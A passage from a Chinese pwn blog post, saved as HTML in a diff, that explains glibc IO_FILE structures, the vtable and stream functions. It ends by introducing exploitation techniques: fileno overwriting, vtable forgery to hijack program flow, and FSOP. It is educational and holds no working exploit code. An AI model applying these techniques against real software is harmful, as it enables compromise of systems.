@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"a1ph0nse.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="IO_FILE是linux中的文件流，在堆利用无法使用hook来get shell时，常常通过IO_FILE的方式控制程序流来get shell。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IO_FILE">
+<meta property="og:url" content="https://a1ph0nse.github.io/2023/01/02/IO_FILE/index.html">
+<meta property="og:site_name" content="a1ph0nse">
+<meta property="og:description" content="IO_FILE是linux中的文件流，在堆利用无法使用hook来get shell时，常常通过IO_FILE的方式控制程序流来get shell。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-01-01T16:01:40.000Z">
+<meta property="article:modified_time" content="2023-03-19T13:01:30.000Z">
+<meta property="article:author" content="a1ph0nse">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="IO_FILE">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://a1ph0nse.github.io/2023/01/02/IO_FILE/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>IO_FILE | a1ph0nse</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">a1ph0nse</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">一个菜狗的挣扎</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://a1ph0nse.github.io/2023/01/02/IO_FILE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="a1ph0nse">
+      <meta itemprop="description" content="pwn菜狗、cs菜鸡">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="a1ph0nse">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          IO_FILE
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-01-02 00:01:40" itemprop="dateCreated datePublished" datetime="2023-01-02T00:01:40+08:00">2023-01-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-19 21:01:30" itemprop="dateModified" datetime="2023-03-19T21:01:30+08:00">2023-03-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>IO_FILE是linux中的文件流，在堆利用无法使用hook来get shell时，常常通过IO_FILE的方式控制程序流来get shell。</p>
+<span id="more"></span>
+
+<p>在linux中，一切都被当作文件处理，那自然就包括了IO，IO_FILE就是用来描述IO的文件结构体。所有的文件流文件都是_IO_FILE_plus的结构。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE file; <span class="comment">//完整的结构体内容</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span>* <span class="title">vtable</span>;</span> <span class="comment">//仅有一个指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中file是文件流，是linux中用于描述文件的结构，包含文件的关键数据，vtable则是一个<strong>虚表（虚拟函数表）</strong>，保存的是各种操作函数的指针，在对文件流进行操作时，实际是调用该虚表中的函数。</p>
+<p>为了管理所有的IO流，存在一个<strong>全局变量</strong>_IO_list_all的指针，这个指针指向<strong>IO_2_1_stderr</strong> 这个IO_FILE结构体，_IO_FILE结构体中会通过指针形成链表连接在一起。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span>* _<span class="title">IO_list_all</span>;</span> </span><br></pre></td></tr></table></figure>
+
+<p>在使用fopen函数打开文件时，会创建一个对应该文件的_IO_FILE_plus结构体，并将其存放在<strong>堆</strong>中，其<strong>返回值就是其_IO_FILE结构file</strong>。</p>
+<p>除了_IO_2_1_stderr_（stderr）之外，程序原本还有输入输出流，因此堆中还有_IO_2_1_stdout_和_IO_2_1_stdin_。在链表中stderr-&gt;stdout-&gt;stdin。新加入的IO_FILE会从头（_IO_list_all）处链入链表，因此stdin实际上是链表的最后一个，所以他们的对应文件描述符0(stdin),1(stdout),2(stderr)也是有道理的。</p>
+<p>因为_IO_FILE存放在堆中（stderr、stdout、stdin除外，他们在libc中），因此许多对IO_FILE的利用都与堆相关。</p>
+<p>完整的<code>_IO_FILE_plus</code>结构如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">_IO_FILE_plus = &#123;</span><br><span class="line">	<span class="string">&#x27;amd64&#x27;</span>:&#123;</span><br><span class="line">		<span class="number">0x0</span>:<span class="string">&#x27;_flags&#x27;</span>,</span><br><span class="line">		<span class="number">0x8</span>:<span class="string">&#x27;_IO_read_ptr&#x27;</span>,</span><br><span class="line">		<span class="number">0x10</span>:<span class="string">&#x27;_IO_read_end&#x27;</span>,</span><br><span class="line">		<span class="number">0x18</span>:<span class="string">&#x27;_IO_read_base&#x27;</span>,</span><br><span class="line">		<span class="number">0x20</span>:<span class="string">&#x27;_IO_write_base&#x27;</span>,</span><br><span class="line">		<span class="number">0x28</span>:<span class="string">&#x27;_IO_write_ptr&#x27;</span>,</span><br><span class="line">		<span class="number">0x30</span>:<span class="string">&#x27;_IO_write_end&#x27;</span>,</span><br><span class="line">		<span class="number">0x38</span>:<span class="string">&#x27;_IO_buf_base&#x27;</span>,</span><br><span class="line">		<span class="number">0x40</span>:<span class="string">&#x27;_IO_buf_end&#x27;</span>,</span><br><span class="line">		<span class="number">0x48</span>:<span class="string">&#x27;_IO_save_base&#x27;</span>,</span><br><span class="line">		<span class="number">0x50</span>:<span class="string">&#x27;_IO_backup_base&#x27;</span>,</span><br><span class="line">		<span class="number">0x58</span>:<span class="string">&#x27;_IO_save_end&#x27;</span>,</span><br><span class="line">		<span class="number">0x60</span>:<span class="string">&#x27;_markers&#x27;</span>,</span><br><span class="line">		<span class="number">0x68</span>:<span class="string">&#x27;_chain&#x27;</span>,</span><br><span class="line">		<span class="number">0x70</span>:<span class="string">&#x27;_fileno&#x27;</span>,</span><br><span class="line">		<span class="number">0x74</span>:<span class="string">&#x27;_flags2&#x27;</span>,</span><br><span class="line">		<span class="number">0x78</span>:<span class="string">&#x27;_old_offset&#x27;</span>,</span><br><span class="line">		<span class="number">0x80</span>:<span class="string">&#x27;_cur_column&#x27;</span>,</span><br><span class="line">		<span class="number">0x82</span>:<span class="string">&#x27;_vtable_offset&#x27;</span>,</span><br><span class="line">		<span class="number">0x83</span>:<span class="string">&#x27;_shortbuf&#x27;</span>,</span><br><span class="line">		<span class="number">0x88</span>:<span class="string">&#x27;_lock&#x27;</span>,</span><br><span class="line">		<span class="number">0x90</span>:<span class="string">&#x27;_offset&#x27;</span>,</span><br><span class="line">		<span class="number">0x98</span>:<span class="string">&#x27;_codecvt&#x27;</span>,</span><br><span class="line">		<span class="number">0xa0</span>:<span class="string">&#x27;_wide_data&#x27;</span>,</span><br><span class="line">		<span class="number">0xa8</span>:<span class="string">&#x27;_freeres_list&#x27;</span>,</span><br><span class="line">		<span class="number">0xb0</span>:<span class="string">&#x27;_freeres_buf&#x27;</span>,</span><br><span class="line">		<span class="number">0xb8</span>:<span class="string">&#x27;__pad5&#x27;</span>,</span><br><span class="line">		<span class="number">0xc0</span>:<span class="string">&#x27;_mode&#x27;</span>,</span><br><span class="line">		<span class="number">0xc4</span>:<span class="string">&#x27;_unused2&#x27;</span>,</span><br><span class="line">		<span class="number">0xd8</span>:<span class="string">&#x27;vtable&#x27;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h2><p>其中_IO_FILE的结构如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags; <span class="comment">/* low-order is flags.*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; </span><br><span class="line">  <span class="type">char</span> *_IO_backup_base; </span><br><span class="line">  <span class="type">char</span> *_IO_save_end; </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span><span class="comment">/*指向下一个file结构*/</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; </span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line">  <span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE <span class="comment">//开始宏判断（这段判断结果为否，所以没有定义_IO_FILE_complete，下面还是_IO_FILE）</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//结束宏判断</span></span></span><br><span class="line">[...] </span><br><span class="line"><span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到_IO_FILE结构中存放着文件的基本信息，比如说：读/写的起始和结束位置，当前读/写位置，缓冲区的起始和结束位置，保存位置等。</p>
+<p>比较关键的还有一个_chain，它指向下一个_IO_FILE结构，通过该指针将所有_IO_FILE连成一个链表。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span><span class="comment">/*指向下一个file结构*/</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="IO-JUMP-t虚表"><a href="#IO-JUMP-t虚表" class="headerlink" title="_IO_JUMP_t虚表"></a>_IO_JUMP_t虚表</h2><h3 id="虚表和虚函数"><a href="#虚表和虚函数" class="headerlink" title="虚表和虚函数"></a>虚表和虚函数</h3><p>虚表和虚函数在C语言中不常见，甚至不像C++那样有virtual关键字实现虚函数。实际上虚表和虚函数是用于实现<strong>多态</strong>这种特性的，而C语言本身是面向过程的，因此没有virtual也在情理之中。</p>
+<p>但实际上，C语言是可以做到面向对象的，通过struct结构体可以实现类似类的结构，<strong>结构体中的数据就相当于是类中的成员变量，结构体中的函数指针就相当于是类中的成员函数</strong>。</p>
+<p>但是这种方法本身也有些弊端，每个结构体实例都会包含所有的函数指针，而每个函数指针都要占据空间（即使其没有被使用）。因此在C语言编程中很少会有将函数指针写在结构体内的，而是在结构体外写一个函数，通过参数传入结构体的实例来对结构体进行操作。实际上在C++中，如果没有virtual关键字的话，编译器也会采取类似的方法对成员函数进行处理。</p>
+<p>但如果要实现<strong>多态</strong>的话，就不能用这种节省内存的方法了。对于C语言而言，就是将函数指针放在结构体中，每一个结构体实例通过该函数指针指向自己定义的函数，并且通过该函数指针调用它，这样的函数就可以说是虚函数。</p>
+<p>那虚表是什么呢？毕竟虚函数的数量可能不止一个，并且和一般的函数有些不一样（存在其他同名函数），为了方便对每个实例的虚函数进行管理，就有了虚表这种结构。<strong>虚表实际上就是虚函数的表，用来管理虚函数</strong>，虚表是从属于该类的，会通过一个指针指向该虚表。</p>
+<h3 id="IO-JUMP-T结构"><a href="#IO-JUMP-T结构" class="headerlink" title="_IO_JUMP_T结构"></a>_IO_JUMP_T结构</h3><p>_IO_jump_t结构如下:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP_FIELD(TYPE, NAME) TYPE NAME</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);<span class="comment">//0</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);<span class="comment">//1 DUMMY</span></span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);<span class="comment">//2 finish</span></span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);<span class="comment">//3 overflow</span></span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);<span class="comment">//4 underflow</span></span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);<span class="comment">//5 uflow</span></span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<span class="comment">//6 pbackfail </span></span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);<span class="comment">//7 xsputn</span></span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<span class="comment">//8 xsgetn</span></span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);<span class="comment">//9 seekoff</span></span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);<span class="comment">//10 seekpos</span></span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);<span class="comment">//11 setbuf</span></span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);<span class="comment">//12 sync</span></span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);<span class="comment">//13 doallocate</span></span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);<span class="comment">//14 read</span></span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);<span class="comment">//15 write</span></span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);<span class="comment">//16 seek</span></span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);<span class="comment">//17 close</span></span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);<span class="comment">//18 stat</span></span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<span class="comment">//19 showmanyc</span></span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);<span class="comment">//20 imbue</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>对文件操作的函数都会调用该文件流中vtable中的函数</p>
+<h3 id="部分文件操作函数简介"><a href="#部分文件操作函数简介" class="headerlink" title="部分文件操作函数简介"></a>部分文件操作函数简介</h3><h4 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h4><p>fread 是标准 IO 库函数，作用是从文件流中读数据，函数原型如下:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fread</span> <span class="params">( <span class="type">void</span> *buffer, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *stream)</span> ;</span><br></pre></td></tr></table></figure>
+
+<p>fread 的代码位于 /libio/iofread.c 中，函数名为_IO_fread，但真正的功能实现在子函数_IO_sgetn 中。在_IO_sgetn 函数中会取出vtable中的_IO_XSGETN并调用。</p>
+<h4 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h4><p>fwrite 也是标准 IO 库函数，作用是向文件流写入数据，函数原型如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* buffer, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE* stream)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>fwrite 的代码位于 / libio/iofwrite.c 中，函数名为_IO_fwrite。 在_IO_fwrite 中主要是调用_IO_XSPUTN 来实现写入的功能。调用_IO_XSPUTN需要首先取出 vtable 中的指针，再跳过去进行调用。</p>
+<h4 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h4><p>fopen 在标准 IO 库中用于打开文件，函数原型如下:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FILE *<span class="title function_">fopen</span><span class="params">(<span class="type">char</span> *filename, *type)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>首先fopen中会为该文件创建一个FILE结构，由于其内部<strong>使用malloc函数为FILE结构分配空间</strong>，因此该FILE结构在堆上。</p>
+<p>之后fopen会初始化vtable的内容，并调用_IO_file_init 对FILE初始化操作。</p>
+<p>最后fopen会将该IO_FILE链入_IO_list_all指向的链表中，并调用系统调用open。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//可见_chain指向的是更先创建的IO_FILE，_IO_list_all指向的始终是最后创建的IO_FILE</span></span><br><span class="line">fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">_IO_list_all = fp;</span><br></pre></td></tr></table></figure>
+
+<h4 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h4><p>fclose 是标准 IO 库中用于关闭已打开文件的函数，函数原型如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fclose</span><span class="params">(FILE *stream)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>fclose和fopen的操作正好相反，fclose首先会调用_IO_unlink_it 将指定的 FILE 从_chain 链表中脱链。</p>
+<p>之后会调用_IO_file_close_it 函数，_IO_file_close_it 会调用系统接口 close 关闭文件。</p>
+<p>最后调用 vtable 中的_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构。</p>
+<h4 id="printf-puts"><a href="#printf-puts" class="headerlink" title="printf/puts"></a>printf/puts</h4><p>printf 和 puts 是常用的输出函数，在 printf 的参数是以’\n’结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。</p>
+<p>puts 在源码中实现的函数是_IO_puts，这个函数的操作与 fwrite 的流程大致相同，函数内部同样会调用 vtable 中的_IO_sputn，结果会执行_IO_new_file_xsputn，最后会调用到系统接口 write 函数。</p>
+<p>printf 的调用栈回溯如下，同样是通过_IO_file_xsputn 实现</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">vfprintf</span>+<span class="number">11</span></span><br><span class="line">_IO_file_xsputn</span><br><span class="line">_IO_file_overflow</span><br><span class="line">funlockfile</span><br><span class="line">_IO_file_write</span><br><span class="line">write</span><br></pre></td></tr></table></figure>
+
+<h2 id="IO-FILE利用"><a href="#IO-FILE利用" class="headerlink" title="IO_FILE利用"></a>IO_FILE利用</h2><h3 id="对fileno的利用"><a href="#对fileno的利用" class="headerlink" title="对fileno的利用"></a>对fileno的利用</h3><p>每个文件流都有一个文件描述符<code>stdin:0, stdout:1, stderr:2</code>，这个文件描述符保存在<code>IO_FILE+0x70</code>的<code>fileno</code>字段。</p>
+<p>修改该字段能够修改文件处理的位置，本来<code>fileno==0</code>表示从标准输入中读取，修改为<code>3</code>则表示为从文件描述符为<code>3</code>的文件（已经<code>open</code>的文件）中读取。</p>
+<h3 id="伪造-vtable-劫持程序流程-libc2-23及以前"><a href="#伪造-vtable-劫持程序流程-libc2-23及以前" class="headerlink" title="伪造 vtable 劫持程序流程(libc2.23及以前)"></a>伪造 vtable 劫持程序流程(libc2.23及以前)</h3><p>许多与文件相关的操作都要对IO_FILE进行操作，这就离不开_IO_FILE_plus中的vtable，一些函数会从vtable中取出函数指针进行调用。因此如果能伪造vtable的话，我们就能劫持程序的流程。</p>
+<p>伪造vtable一般有两种做法:</p>
+<ol>
+<li>直接修改vtable中的函数指针</li>
+<li>覆盖vtable指向我们控制的内存，并在其中伪造vtable</li>
+</ol>
+<h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>FSOP 是 File Stream Oriented Programming 的缩写（面向文件流编程），进程内所有的_IO_FILE 结构会使用<code>_chain</code> 域相互连接形成一个链表，<code>_IO_list_all</code> 指向链表头。</p>
